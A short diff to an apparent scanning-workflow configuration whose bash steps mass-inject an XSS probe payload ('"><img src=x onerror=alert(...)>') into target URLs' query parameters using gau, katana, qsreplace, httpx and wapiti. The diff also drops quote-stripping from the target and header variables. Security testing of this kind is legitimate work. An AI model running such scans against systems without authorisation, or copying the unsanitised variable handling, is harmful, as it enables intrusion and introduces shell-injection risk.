@@ -10,14 +10,14 @@ steps:
   - name: CustomXSS-External
     command: bash
     script: |
-      gau ${target//\"} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+      gau ${target} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
 
   - name: CustomXSS-Internal
     command: bash
     script: |
-      httpx -u $target | katana -H ${header//\"} qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+      httpx -u $target | katana -H ${header} qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
 
   - name: AutoXSS
     command: bash
     script: |
-      ~/go/bin/httpx -u $target -o resXSS_${target//\"}.txt ; wapiti -u "$(cat resXSS_${target//\"}.txt)" -m xss -H ${header//\"}
+      ~/go/bin/httpx -u $target -o resXSS_${target}.txt ; wapiti -u "$(cat resXSS_${target}.txt)" -m xss -H ${header}
